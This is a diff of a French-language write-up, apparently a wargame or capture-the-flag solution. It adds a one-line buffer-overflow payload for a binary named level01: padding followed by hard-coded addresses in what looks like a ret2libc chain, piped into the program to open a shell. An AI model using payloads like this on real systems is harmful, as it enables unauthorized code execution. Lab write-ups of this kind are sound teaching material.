@@ -74,6 +74,9 @@ Ce qui nous fait :
     )'; cat) | ./level01
 ```
 
+
+```bash
+(python -c 'print("dat_wil\n"+ "B"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
 ---
 
 ## Vérification
